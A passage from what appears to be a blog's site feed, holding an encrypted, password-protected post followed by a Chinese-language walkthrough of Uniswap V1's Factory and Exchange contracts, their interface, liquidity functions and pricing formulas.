e931bd8f82e2b463d8457541d5231ce2617dd03b44b47de6b14aedd91c35d379b9fb053c1a6dd04146d3a979f27b981d939ace8430492d3c90f389c85a51ce3c04f1a2b130922f36b700fa2d8af48f6a62fc2d008835b5e2156c57b4278ce73e621bf58312da24c58dfbb0797566ee72d4ab3b22f1d5dcf48a2d301bef5663a786a91ec9c6064c965c7cb3f4d2fdf66919628a00ca08b686c5e84942bed083a6572a4f050ddf9e0aecc10a896ce29529b86c578ed21720a1ff13fe6f8c17dbe48078a192de1cdcf2592b9d29eb14ca3f97b9ede276040e4fbe570af1152ee127558298c7d3dd3f7da3df050916fc8e3882a7546e40e1f3c2e8a52bffadf22ebd66e7968c74547ad484c7bda3ac9d5e75ff1a6b820f684e6748aab162fa8b61a38d23ee7a9a86ce8d97b4f02a235c3724dc296963d60bde7982df1aee7231d6d5670d3f92d4a02adbab294ebf19e09fa926f54f3617d2e9c6eeabd1e0465dcc17c2aa5e5374e5e46885332504c558bdc40bb3176f76c7cfca2076fa467b217e998d35fdc9ecff8b1f79a9151a44febafbe6b483eea16dc96a546d16a578bca499f227b45a6f1fc2c38be0bb930300e18d3706c72912e1a26c1217279275d76b10aef9ab53c8de502e437dd703c342161c3eaebb79c353abbf5012ae76fdf2d64d59f465635827f8ce274cb3c4449aaf040760070be1c6dd997c4573e04579c21b2260ec8127489fbda8af024dd047ec33ebbf16539e8bc2a951b39df35af440ff54e08b0c01b45ce1820198cee79908b54461b02ffbcabefb9db6509210713738fc328679ebd43eaf6ffcad736cd460c2a40b83f1483af3c5ea08cd334a86f7b03067d40458e6825e2b1502a9844c679a50148c0f16fc4cdb08634be1f35ad342b9b0b87810040737cc60d9cdfc1afbca366cc6bd52c7a1737ff5687a092357d5e61bdda4c3f6d55224c279a5300aa352463dc836379da7a8f8db09cf6ad4f9861b4164e50ecbc81cbec4c25197ffa7fbc808e820e8ecc804c79c6f1285ca0eb67026e5c8b1161bbb2548f1d37fabd510230ec69d3b00ffb0f4205d1ffa86f0a2a7df3796ec4c2f06e9d5bec5af488763708585ec95519dfd34f4aff95ca73a686394fd1b3500416254baa82c17bf24deea70bf579db7ca33b098eb943768091531ac80648c611e227af0999687b340977d3014b05e50ca540e894ed56f724d45ed83057236c7b7c710f0eab0dee312890418df8b128be4cc07aaca2697be73ba3c2898ca45a0b7c9682a11a61d17b37138b1aabdf1b192fae67e97b90a137cb9f4400084a840d37eb07866fea17c04bf841ce5769e38b6cd00abbedc50313c2a3cbe0ee794fdf20a1cb253bf7f417e4d34faad854299f5996e28e8b7f3984aecc506de2d1feae0a41c5171f17b55bfb12ee0f705bbb96e78a621f444db70f87321f0d88bf3044d75bcafedfabe8aeb69e1c969a67405007820219b8c859fbb03d65a82fa92ea4a719e267b1c188f1847c7f082dc83c75d9c90efed01af266a062ff6ffba664a2a854db13048e7fdef035b2ffd42481e9f65629b6a132160ca3d03e3964bc8196314963174f44c731200ac0876b7f21587b16d5c1b60bf7d120e966f1196bbe2e3855469d7742e4be04489bf259f85a6f42c58fad58e3bd9d77158228cfcab23c0cb421234932aa8564a31ccf6187c51374923bfc4f365d410edba5d1cfb23ae4bbb6c29f00cbe19cec7e84668104a733b9fe96138ea20f6c822f0924559ad35e8d65d403c1ca3f7174472a777305ffdf09d45b35155eb24a9a81f7fcb84b3ab42cae9b118639766c37db2c705857468dd1a38c276a64e4557d196456a60a28b8466f81ca694293b66c6224e0d0ac655e90df55b3be2d7074e1a6cd4d4933338cda8d7399f2e9973df4635125c5794fd35db68e1a036fe9a4e62b09d061e9be2214151ccff2db1f039fbf27df4d28e4f2c9faee9261daa8195cd4d1e3714c1829c219fac116cfea47c659af927ef979f5481470d77e3c2bf66dab740bdd3e4c49e073851fe1bd61ba83c78b2fa159a2660847984c348d33cc4830d0b9ad2f008719346722dc116be2c60d50509a71b446b3749d061e43956c1dddc6311d2fa2257893ee412055d475079103fc274c57081a666d7844b7e6cb128bda5afa0511c8022c1fe1b028db4504b02a24cad9e2b759f1c83ab2aedad1707190c9fe67990fdb0d83ad6d5f6c75027ddb30c8e4dc2bf13662efd14c0609d564ba22688fbb149da48a886885e8cb2e835fa684cb0f7dfb4d6aeb7aba353982ffc92dd94d0ec01e34fc7cb9705f965c7120ad011ae5b2afc688c03605095c325c6c4f088566636ed07e2b715f8c23c8352d685e26862dc5896263f9555f874e099fd335ebacf59c29b0536e324ea74099ed21a7a7e96b68908b4b03021bbe65b900025538bc235bfde4dec142a5aca8c0f5eff793f0f2b0c4b7331a8f785cd9927d15bc1a6d76735f3cb173a1fbdfeb9c0bc5ccb4365af2d98faab05ec0b25fd7c24755d92a3d60827da1b3828b6528343eefc4173812ce524b6f647efe492a06ce4497ac71ea4040b16853d5853f0cf40a96c8ce6c1e7c47e639222af5aedf3be59115dad6507ee2f52ea382df6c42f4974e5595c82c7e252f9b1d516ccb510de5b3e9130440035330bb5e5fd081c9c986af6159ebda826a02786cc03f53a901ba622a646276c7cd9444f30d05716bac42d187fca66dd9d6dc38522f605241a871a572ce2245e92bd2be89a94ee30052f4caf0fcdd8e89e2333885e08ca21cdc2676004d0ecc6d4114cdd9551c0fd1c02553450044f55ed6c367ce4129311c15534e8d09f299e2e3c01e24dc8451cd670748362f114b837c803a32ba2833d03521fb207377494dc8644710b1770209c28a8065380c56247418db15ba711ddd9d78a149e6c1fe1cc034ab304790800ae7627f306c773ac1a467c5d99a4a3b0869b5b0a5258588d0009e74f22e9e96f7cc1af49a0a5d756cf1952f52fe5036831626c832400c0db129d654f01e4fbd123a9cfb36a7a7f5e33cde49e80410d1f7f8cfc8a131cd06411e0abc8e00f5ea842966a9f7753eb7e62542717708a40cdeee09f24ec6d9a72026952820aafb10f842551dce0b83461b8908516ba97256c19103f366f1643b963fb34c39badad13935de95506d36e6b9f47c4db8c4802cfb6a961a9e7bb0c7a26291f5b202d559ccddb5334bd9362ef30b528dfd2d243451f248230a7dd0cc0e1bc33df51035e2c669a5f84a988043efb15691b21be0b3dc4c0312b438d96aa21c6e1b316226bbcb0fcffb889d18e5859c6adb0ece30477f307458ef676a018374c3a5b850c616ab800e79e1eb16ed25fbd65fef749236198713d3cb2f2ed969b362dcf070839f3b897dff45261e6c85a24908b1a06a29a67bdfc168b3cb522cf9c71d21b7a1b94328119141c56c5793c64b13c16f042cd01ce3ff98e0a7e3fb2d57be16d90482ca8f1637118a48e2bc3fb1ab487b2f3e6ce8150354f726d390e457da2e220edc47d7ec5f8ae701c4a82f0b28522c6728f8a100b8071ae6c9ebfd692acc91bf001cc9e132bda6d916fc6653d8b46de70fb275196e645043181f287350ff7e0deed69f927061264981de668d5a2e7ee579347c7373d0496d5fd41f39f67dc506715ceff640314b3844e5df0512ba0d21b573182a73b23145c432014c718c9bbc3c3e7f4046ab0e5abc6750e8fa6e05ec749fd175143d20ea03237c068e714b91b3344cfb82853363b7c527ce9e946adb5efeeabc1399e290aceb90a1750ffa8b27230f5fd615bac070dcd2e331fc29e59c96fc8a4abd1af702b6c860289a09eb6a3953a2da8fb12a13a2c02a9d1522e43e7c3d7ec9fc9ef52c7032b3dc9e206a1ef245fbc438a588423c5d087ad8bd57793456d3f3ff1c2963ae49c9105be62b89bbac1a886808ad132ad898c3eca3311eac8a64d7b0dbbc2fb3078224e07ea8f0146b1e05b2914bdfea3688af96611c46bf17755db142222c2af1b510a5d86a9a80e289e349d9902ab2301cddc6e24055776f338c42e36377fb811b640af917389536b765278430264eb2c912a914f4568d3d6d47280338b9dbcd21ffa054703e7695d2a1d8151373d8e2bb11bca8e73ec89dd276cc9395116bcb44e62158d5a7b08bc91e4c7f2671459f098bc602bbedeb234466470337aeeae4fad4bde9875c06ce512337abbf1d03900fe6645a8e79750676cf94dad23ca072b502f4b18655c2b86992c9d5d7f1ebc00000bc94ab5db4ea596f2bf657d3fde21210cd1502474c488a3572d8ca19544bde3c4812503d7a481361e02266f92e69db5c0b4c3a5b1ea1b3e121832728ba7aa07734e118eed3d7ea78c1accba678eccb7ac6488687dc44c67c6ac8e57b3773c562a551a5125bef6175e39d197699905663554cf3e2c0eb4446a097e1f206c31d850c075b972104a09e90b10d23deac5987f4618955613f37e7ed7c1a40bc69ddf310fb74ce77e369ef322d452609212c2875e06403b6b3728d3657519e20d8945bd9492b96883b94c06a12b39e30da56e76fa509c3da10f58b6f3c191558c48a2f30918067f23dab34acd4000cff514342f051b0b8d137f4972de8ff5abf2966cec5ddc124c9a9455c3ca7e16c0ddd7c39e301cdd7de9bf5fa564e30c077245ee2d37582c1a226c74f46fcad1c37b0d47037b6903ee9b6789b52f19022b4a6bf6a7afc379b74fa862c9483b36a15e885b8ea26c77858cd92a92dd32773af3f131f182da869539f7412ab71c08a106f8ab0de1aa2d624dc5ab30626890b673ac5af5e548fd47c101dbc1dc5715b962d1605c5bbf1ad5d4c4a0e875357c67fc56bb1bd03bd5d0dcacfc5559bc30f7c2736643b5a7f8de8e889cb2ce7280c9904e7a32828e234485a85aa7f6e91f4746aa002e67b289710efe3af63be6510d668579222366bf4d4ff0a3512caab8e36ef11fd3f0f4d45fe569bf8ca2539cb1260ec9586b586261976f3917728c6c72cdbcc5c4dfdef52ea4795293ef26cdc6e1746bf162064425e9759f1bcc7587eb2ef785bcafca8533f48d17f5b04bfda9743f17335d9512222d92ac004cddef3003b1fb69345934904509966482d3209397db739586ce20e8a3a44ef50b8b1dbe92ced36719b1fffe2d66c6e6f489494e56e7c94b2688c8424c6368c21b37db225856db6247bff0b36322f29a90104746ce106704e510812762efd78bf09d283176e1c8e32b57f67f7f985f9ac0d8ee49f3f577340ad3a8864eb4a7abbcc7bca56f4b86a18b110c514b712bfbb8d104c866bbbb43ca8c94801680b19e1d59280ced992039532e57dc0ea7e76406be1f48c885827298f94c20fd18ddc850d91ce2c2ff6d7bfedbeba59b59551212915e8a552fbe7e0bf9a9f8f746a168cdd3c1027194015a92e008e6361ad4f3118a4365ff5971c92dad4ef0383adc87d317501170e06519d4b4b95103ebf2bc0409e124f8f603923119f53cd873123bed537a81060b40819c6c81b18f048ad616a47ad3dd34582918e842ff84f88088272b1787bef029d83c37f8d4d84fba5a4607c7280a42b0b67addd1534594c28203b4be6382b8064b7ef40b8a855cb03d643573b3d91df178a41352a7c7f186fc9ca9448624ce8ef68cc0bf02ba56bb0190adf82f21e56227da74b8f1ce4d0fe3e79784195be56b5b027735bf59bfbd7aaa29f21a43042fce95e54752af25b8db7e19416617e29572170912cd7385952985f27456179f46c10eb4f83e25271d2a46a535e1a662ba2215482f88431d7bb3d744e1f9113c0a168b934897f02978bd218f270a2e67605bccec08d18d3db0bb9334ca7c88c01eb40f9281da74c165d4376128bcb6f71a862ae210a56bdb6eeafeb9b4efd2ddca5dbc431f27ff81257f5b8652d171eee92b31f9407c55b5557fcb0c05193cbfc6afdee924b643a0d39817b062c20c45626792a744aa22b00ffceb4dec44680a6ac42b67c1028cc265752b177610ab838d85de8e495dcd6f2cdf4bbc9c1c12f34b4c7497f8fdb2eb1578ffe031aa81f4a20fd82b5bd6e04f423c1eb49ef29f545c2e1cf79c923f8d76c73834da668b41b33be307218cecbc32b215ef0138e289ad8634cef7e3d3c6d15731750a91f4479231572157a2af9f417a631923c848ca6db8b51881d898974edbf89bb5ddf7d77c5a1952852fb38ee08e9ea49115b299215b64f8e9dcea4a0a4322588bdb130e9e4fe00fda406e57153edbc0d7e86da104ff7825adb8b33b4a6b4383865fa50f76fb7f0921854dc2e687725d84d12ba275edb964042c4414335f6511c16cddcc72d772d779b60091edce2e4729a6015532e96b419b126b6ff908f1378c55e2663bb41acd5fd602be0847b656d760e4a8a4cebd157368c7cf68f48cb1c645e21cb5512b6449587a7fd0a6e5ad6494d86bf2bd640e923cdf1ddd0fb131f1387765550beadf4804166cbec6fefebb3f0d35bdd5e28edb7adfea697c4ff0f13bc7002ebe38b8f833f18dd4c1888445a2cdae90c0e523d2b91203ffe11c50ec06de64579f1eb345c34c56a3dc0a8e57afa940bd745cd7935c5a5392abd62eae8e53ea537e249d1f9c646e3301c34e2a9ba4b7a25826b6551346d4d66569b73f71df3881954ea215f4e307b952f4f515e589761faf0ba5d17ba703fc3e77f43bc9f90fac25515312d1c9e55c12f69165aadadff94dd7bcba9b097846609310be602b36aa1057651af93cb155a61076c30730fd3edb8ecbb1220243cc7e1809dadc60d4c85febb21f17e6537c19c8464daff9216e49d6c006359eb3c3a9dfdf2153ca597bd75e0fdddefee5df2fee21ecb2dfbb0f271a614b8b23f8ae32a33a40a50ea89976fb615ea25cde930f4b63ae63acc52f8b694f24218b6811660913f4ae4659ea65bcd0f3dc203aa86832f826c0553365d4dc7f71284e2bf8142760dfaa2b8f9b783a6add1e42f1c1d97f183ac5f1cc3fdc0cd8efa2e08dd00e2d56ad523ed9567c9d63347ee41b5d8ba0ee22b70a9ef00412490df72219ac46e292091f7095d4187dbf941adf57b038ebf21316d5c0b8d581ff84aad95316d50872b3e8ec8ed7b4de175af0fd67b06912aac4cdf5cdd65e410be4f1fdfb550fc70ab567619eb02ada5716bbbb28d45aa20d970c2a9ab53f2721288a6fb0a85742d1668121c200190be926f1b350543a506d1b7b94f42130888a1c620e992a7e301bc833f6ddbea225c64fee93ade73e8f27ef0e887d21c10303a876e215d6b52a69d7934b75776a1c7bfc0742634df7f3bb3106781e69bf5bd1e86a56d7337d89f788c759659267cf570a4db65ae98024d342ae8eadc54333fc892af1482a7b1e7e9d120b561db408dbf31f471ff37a0b4f38b186d6084eaa62e404056c13ba09b6e31d0a0fde157a37bed395651e0633e50a05bb9be97d3c85cddfa59573473db6327026619cf97715da8755877aef3b56b8aec4b03edd1e3c715ba97788ba29e52327486b9683ab74bbdb54a056f76446b7a098d8f23738e393f9ec623b31289ede5256617a984910c707d7b0de48670b3de4ef46bea4e8effd1a0425e0ef27eafce00b878c6e0f912cb10ff0067bb8c4126fb6a9d084a67206d0438ed4a58ec388260295a452f80bb95adb82e5879a242c414aa42e11da4b1eb72d31efa34dae2de1f721d7b186bfe49d56f7c7514eb6da9f09c5301ae7127936c7d3cdffc978fcd9c8d90982fe01e62f603f8c52fb59a4a830468d92349d2361c85ec7f54ec518bba632693e0c853dadb23b19460a28493edd783166f1338d7952216b495b7ad8060173c7c17cea83785efaf2c254e07c0973e79599ac0abe83d186ca6efa2255f637616a4e217e8d3f13832ce16bb67450a3e7d6d78ee626a34731865d0284c373fb9b78b74b7f8f78d699b6597fe27d7c40c728248423ce22f2b658c046b4f553526f2bb581b5a380a7563fc4d6e6cec3f2c86903a16b2dbbf573d36cdad9550e4223e2a383ec1c31733359b9dde532b29f5b8eab26a3d3c30141ea44505ed55d313b661f2cb6648ead1a18e82ddd4438bbd7bad841036d7508e8d773ee6455ab2e2288ca7c8fedf05aab35c7eab84647de8bfca2dcc268cad9032146615fd8d39e2baeb11cc0b3a786800d581dc59573b2932aec24925efdca24fd96e844d833f4a847b30b23845c16bcd3d73f0bf1e98466a754cd0bd82ebb3d97aa118f212081fafd99c3bce360d3db47306e403decfb6698d35e12c57778ec91168beebbe921a0f8908236ba2fbebc52e7af4a83056f51d168d19dbabc6e305e5af430f6f0e81648cd6981160bebbc8a8949bc781afa2b989939527617d426aa5f9b7ed815e37632141a6df67f86f6c9aef13e0e184a1f2a50c39a71e36b47c89cd60a0a11f0e4bbea52a9065a0b62db2784f7e8014aabf0c05951aa758ad319144e6ee9a39e699e054feb1138a0965a068b36d83213939be7b147d8af6f065a8620e884d377a02e939b192cf00b432d9cb3e6696d2317bf1607a45c7599fc1c98c08db578a476485035d14948629e8961faaede57ffd7dfc92b8b340fda437a3002b30910f92cde166bfd9516f831029099af9e53e6c7095b0f112982bae3981329e65a9bc64af415060dc67192d8232d59ee9cd3d96b6ef12cb0de78867bbc8cdf9289a5a1a5a6ce338681e9f77b9a85dbe0cb3dafb872434ac0dbe3be0d2f9683d3d4fc9451a12aeaf6d3b748441c482b88ecedd5ff0d735ef62002b37acdcc2cd18a01c6ddd0807e79d7c416d6cfac74b3b022e985bbdfe46e96213335b11fa904e2f61873855b620c32de8f2c854d99f73577f41f153fe6e417a504adfb0c452830a6422fae1a4f3b9cb2dc5b2e0f169c18b54c45ff08caa39c3f4375a98815dfe632e2c575c72eed34a705634ba7488bf0ed7e94ecb01aa5f3b75a16ff452cf6a0d716504f3af4bc3f943702e767e453dc00a425072e47251b7856a60bcce1cd723530f1060af31c3d185a7f076e8e0480de4741e8b8c877e4d790634532f84e2822f3363ea319c979f48a11bc17dd0f0f07e3a9ae1d41798cbc341b166474e263aa44b41f896eea3388afcc54baf17ebf5f5b1de7a0b36d9826cab38a4e6c4bab6e95ccf85b217421d25c0c808710e3c7ed385880f2a7e66cd3b9c2a462597169abfe0d2bb0324247a1f6eef1df0eafa4bdda8e280de84b10fb122bddb325cfab3952609b07787eb1729934f95d5d12d570f6f1219892df39f95cd938a5e2726c04df251923d5929604357baecb5a1f3120db68aa3c2173f2708bbd113cce5d45eb268a9abe77374a33da8732d33cfe30c1098108406dfc8abc07883ec098744647bc0c74bc9fdae60d07f089dc0c080fdcc96a77a3d1e97161ea87d491573e506bd2721b5ce637436ca9fb02f5a37b1bc4ec61e5bdfe519ef5b67b1793e2fd6a75fe701f973f5ad52816b88aa149bab25b347897d7c7461f0d935f4033309ead3b74403b4ef0309fd3041ddf4173b741e49bd674d3916684839b98df1ef5a59145c75b25009513cca04f67c716a9d0d4a4d24f3419f059d346cf661d1ffd0958dcf0e50dcd48cd3ec60f587f86e6117509819893cfaf0e2344fa8ef95d9b190e0a26e86c5429415040cc6d512135555189af84efef04da29b93bad9c4345c020fa2d99684eb689b342e512938bb9876f07f648d4df3045f22f3812e6a6ec9bd370a23a319f804b2eb773cb1bf0b45803f62ac1f924ac1e35cf557982e92d2ca21cb3bd3f60e15a8f06e134fe5aff28700ebebee528ada12c605d0817eacab152d197a5210f1b2f5f35088a684be9110980a734bb26185f03cd2e8058362a6d8ac66f93d108286a755c483f4f3f7ff88ef1d61d65fac8c233d50ba93be1dd3fe8c953c958fe0b2847a0743c90cfbad52d5783aa3fe1af46207af7b474d6935e1af43159ec22ac71137d7a3eeea528a60c8fe14469feb8a887ca8996a660f991e0b9d29fe76e0784fc2dd63c0df7e7b49187ed8ea0db9564efe5f2d510eb72442d6e8440da9ebfb06aa4cea644f782f5aa3859eb5eef03b10e6a3f202bd0a4565da592c0a1776fee92207468163d5773de68882bb96e687b2539f280b052fbb0de417760a6231ff9cb2573882a34b806373efda551d16537d96593ad31f6e4a0159a610eac4d4cc0601f6d4badf45aadeee9cec35b5bbce1be6fae3f47df5ba8c25a9c0c3b766b4e346400cf0fb81916e1c3324b9226e839a384a950a42a02015a2d5c643dfef447410be780f3d89a15992b34cfbba422847000388905cc48bb9d332ffcfab1037215fd84bdfd531071a12d4522291c2fc6675de41d0f500951c64c02318279922e84a2ade856892ac09162dbb2992d9953ae18483ed69815a74aa76fcfeb7a337ab2f7cf46a66aaf1afc6be75e3be593d6ec6bd98a5bc04e715cda58961b8182ba547036bfb524ccf511208eca0d559a74cf9fc99f2a3c6e716c93e7249102cfa23d35a3d90e85e988dc0c43d585f0e688e8a8b79c58fa8cdddbeb44b8f8e0870756db943c8b45c27ab43437ab44a183f8be3e2c69d28817ad0579e5f296f350b7a91583e9ad84ddcc5977fba97a7f7345fd7a5b18ab1be8fea0a3510ae159dd8f3f4239111dcc1314e4c79c6870535690e195a7bd5b2c524c3b7018b07e1f9c4d5fe49892ed4f92a029f29487e6a07ebe9a3dc8e6f75bf55c81c21734fe1c26c42d22b913c39296f56ccfe85337b15f32a2ad41a1dc252e96dc784eb3b6faac0de3fa0e22373c1a64221ff10b6b8618f0714e4ce4aa0a45f5f85e864b2abf531d476fe045940732ee724b96706c43a5089087ca0b157c6bb784f1a79464139b63aa4a61dcc739541fc2d2cda64d516a747137f5cdf79df2f6fa8b23fa126aa4ba4671a0fbbbd4f449c5cf6bbb57cd701cf8f1befbfa7020647cdf944c52bf594606d25eacb621f482e7bc94140a29658964d752007c54304127ebb2542e0365761b5a86901516bd392e66a0706bf35f47cc37c6821fb09d1490e21d61c347ba2ba4bf208367994338c3b6b11f206ae276a0f69b5aff3ba37bd6ba1c5a8965e3d4c43248d66dddbfdf48ec27f331fb0c86f8136fde3b076d9f71b534eb049c0c6b685968321754fd9bb16ab7e62aa3b0e8a90c01eee688faf19561dbc3440b38e0758f47a4ec078a564be00c77bc9dfc34edf76f81283fa668bbbbb5184692026edc96a14a695f84ad3198ed626e2254f8eb4e31c9f8e04af5174943f51c73d80586f7f2f16efeb4d80eab19ed258fb51e22ebe18d05bc4f6ea041121c0c17037db2a61666cc9d6eef93a48c0c56e58cc416c1d30fe93d81410a86b3e9f8657ef9747483c14d09f9a1439d46412086a30e7d93371d76c9895f86506b9354145a69f578b23f52c5fd5bc6b908b79719f5536567f117a6d9dbbfc500f176a4de3f5e796f575e01fc961834cd5244de507c6a507dcf06cfa534ac780c427ee39b3fafaa2b73eee90a94eebf7eb0e968d85fa634ff64b12f9435813bdf598f52221848b6f7de2619fec8d02150adfded3e683eb6e9dc34c4176aea41ef6c6d9042b9108a463b1cf5fb1f24a579a716ba3e22bac3b224e84a87a82ab0f26944a7195aa57751f35496a0ad2b1f6cce2071fe32f2b</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 03.Uniswap </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>02.uniswap_v1_code</title>
      <link href="/2023/06/23/03.Uniswap/02.uniswap_v1_code/"/>
      <url>/2023/06/23/03.Uniswap/02.uniswap_v1_code/</url>
      
        <content type="html"><![CDATA[<h1 id="uniswap-v1-code"><a href="#uniswap-v1-code" class="headerlink" title="uniswap_v1_code"></a>uniswap_v1_code</h1><p>Uniswap V1是用Vyper言语进行开发的，Vyper是一种语法和Python非常挨近的言语。</p><p><strong>V1的体系分为两个部分：</strong></p><ul><li><a href="https://github.com/Uniswap/v1-contracts/blob/master/contracts/uniswap_exchange.vy">Exchange</a>：用于进行ETH和ERC-20代币之间的兑换。</li><li><a href="https://github.com/Uniswap/v1-contracts/blob/master/contracts/uniswap_factory.vy">Factory</a>：用于创立和记录一切的Exchange，也用于查询代币对应的Exchange。</li></ul><h2 id="Factory"><a href="#Factory" class="headerlink" title="Factory"></a>Factory</h2><ul><li><code>initializeFactory</code>：只在创建的时候被调用，一旦设置了<code>template</code>参数后就无法更改，确保了用于创建Exchange的代码模板不会被修改。<code>template</code>是链上部署的合约，用于作为后续创建的Exchange的模板。</li><li><code>createExchange</code>：用于从模板创建一个Exchange。在做一些必要的校验之后，代码调用内置函数<code>create_with_code_of</code>拷贝<code>exchangeTemplate</code>所指示的地址中的代码创建一个新的合约并返回其地址。随后调用新创建的Exchange的setup函数设置代币地址，并将新创建的Exchange记录在合约内。注意到在做验证的过程中，函数约束每一个代币只能对应一个Exchange，这是为了约束某个代币的所有流动性都划分在一个池子中，增加池子中对应的存储量，降低交易的滑点。</li></ul><h2 id="Exchange"><a href="#Exchange" class="headerlink" title="Exchange"></a>Exchange</h2><p>从Factory的代码可以看出，Uniswap的核心功能在Exchange中进行实现。Exchange的实现略有复杂，首先给出所有功能的接口，接下来按照每个接口的功能介绍其实现：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">// 只保留了Exchange的核心功能接口</span><br><span class="line">interface UniswapExchangeInterface &#123;</span><br><span class="line">    // 流动性</span><br><span class="line">    function addLiquidity(uint256 min_liquidity, uint256 max_tokens, uint256 deadline) external payable returns (uint256);</span><br><span class="line">    function removeLiquidity(uint256 amount, uint256 min_eth, uint256 min_tokens, uint256 deadline) external returns (uint256, uint256);</span><br><span class="line">    // 价格查询</span><br><span class="line">    function getEthToTokenInputPrice(uint256 eth_sold) external view returns (uint256 tokens_bought);</span><br><span class="line">    function getEthToTokenOutputPrice(uint256 tokens_bought) external view returns (uint256 eth_sold);</span><br><span class="line">    function getTokenToEthInputPrice(uint256 tokens_sold) external view returns (uint256 eth_bought);</span><br><span class="line">    function getTokenToEthOutputPrice(uint256 eth_bought) external view returns (uint256 tokens_sold);</span><br><span class="line">    // 提供ETH以兑换代币</span><br><span class="line">    function ethToTokenSwapInput(uint256 min_tokens, uint256 deadline) external payable returns (uint256  tokens_bought);</span><br><span class="line">    function ethToTokenTransferInput(uint256 min_tokens, uint256 deadline, address recipient) external payable returns (uint256  tokens_bought);</span><br><span class="line">    function ethToTokenSwapOutput(uint256 tokens_bought, uint256 deadline) external payable returns (uint256  eth_sold);</span><br><span class="line">    function ethToTokenTransferOutput(uint256 tokens_bought, uint256 deadline, address recipient) external payable returns (uint256  eth_sold);</span><br><span class="line">    // 提供代币以兑换ETH</span><br><span class="line">    function tokenToEthSwapInput(uint256 tokens_sold, uint256 min_eth, uint256 deadline) external returns (uint256  eth_bought);</span><br><span class="line">    function tokenToEthTransferInput(uint256 tokens_sold, uint256 min_eth, uint256 deadline, address recipient) external returns (uint256  eth_bought);</span><br><span class="line">    function tokenToEthSwapOutput(uint256 eth_bought, uint256 max_tokens, uint256 deadline) external returns (uint256  tokens_sold);</span><br><span class="line">    function tokenToEthTransferOutput(uint256 eth_bought, uint256 max_tokens, uint256 deadline, address recipient) external returns (uint256  tokens_sold);</span><br><span class="line">    // 代币之间的互换</span><br><span class="line">    function tokenToTokenSwapInput(uint256 tokens_sold, uint256 min_tokens_bought, uint256 min_eth_bought, uint256 deadline, address token_addr) external returns (uint256  tokens_bought);</span><br><span class="line">    function tokenToTokenTransferInput(uint256 tokens_sold, uint256 min_tokens_bought, uint256 min_eth_bought, uint256 deadline, address recipient, address token_addr) external returns (uint256  tokens_bought);</span><br><span class="line">    function tokenToTokenSwapOutput(uint256 tokens_bought, uint256 max_tokens_sold, uint256 max_eth_sold, uint256 deadline, address token_addr) external returns (uint256  tokens_sold);</span><br><span class="line">    function tokenToTokenTransferOutput(uint256 tokens_bought, uint256 max_tokens_sold, uint256 max_eth_sold, uint256 deadline, address recipient, address token_addr) external returns (uint256  tokens_sold);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="添加流动性"><a href="#添加流动性" class="headerlink" title="添加流动性"></a>添加流动性</h3><p>用户可以调用<code>addLiquidity</code>和<code>removeLiquidity</code>向资金池中添加和取回流动性。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">addLiquidity(min_liquidity: uint256, max_tokens: uint256, deadline: timestamp) -&gt; uint256</span><br></pre></td></tr></table></figure><p>向资金池添加流动性。Uniswap V1中添加流动性的过程简述如下： </p><ol><li>用户调用<code>addLiquidity</code>函数并发送一定量的ETH。</li><li>Uniswap Exchange要求用户按照当前资金池中的ETH和代币的比例添加流动性。Uniswap通过比较发送的ETH量和池子中的ETH数量，计算用户需要发送的代币数量Token(deposit)，并将该数量的代币从用户（交易的Sender）转给自己。</li><li>为了证明用户确实提供了流动性及用户流动性所占的份额，Uniswap Exchange将向用户发放LP（Liquidity Pool）代币，其数量为Amout(LPToken)。</li></ol><script type="math/tex; mode=display">Token_{Deposited}=Token_{Pool}{ {ETH_{Deposited} }\over ETH_{Pool} }</script><script type="math/tex; mode=display">Amout_{LPToken}=TotalSupplyLPToken{ {ETH_{Deposited} \over ETH_{Pool} } }</script><p>由于Uniswap去中心化的特性，添加流动性的交易发出时和确认时流动性池的兑换比例（或者说价格）可能不同。为了避免这个问题给用户造成的损失，<code>addLiquidity</code>函数提供了三个参数进行控制：</p><ul><li><code>min_liquidity</code>：用户期望的LP代币数量。如果最终产生的LP代币数量过少，则交易会回滚避免损失。</li><li><code>max_tokens</code>：用户想要提供的最大代币量。如果计算得出的代币数量大于这个参数，代表用户不愿意提供更多代币，交易也会回滚。</li><li><code>deadline</code>：时限。如果交易确认的区块时间大于deadline，也会回滚。</li></ul><h3 id="去除流动性"><a href="#去除流动性" class="headerlink" title="去除流动性"></a>去除流动性</h3><p>提供者可以随时销毁他们的流动性代币，以从池中提取他们按比例提供的 ETH 和 ERC20 代币。ETH 和 ERC20 代币按当前汇率（reserve ratio）提取，而不是其原始投资的比率。这意味着一些价值可能会因市场波动和套利而损失。</p><h3 id="价格查询"><a href="#价格查询" class="headerlink" title="价格查询"></a>价格查询</h3><p>下面首先介绍Uniswap V1的价格机制。每个Exchange（或者说一个池子）中有且只有两种资产：ETH和代币，池子中两个资产存量（Reserve）的比率构成了价格，用户可以在ETH和代币以及代币和代币之间自由兑换。因此，用户有两种指定价格的方式：精确指定换出（Output）值，并限定最大的输入值（Input）；或者精确指定换入（Input）值，并设置最小的输出值（Output）。</p><p>因此，Uniswap V1在实现中首先实现了两个私有函数作为定价体系：<code>getInputPrice</code>和<code>getOutputPrice</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span 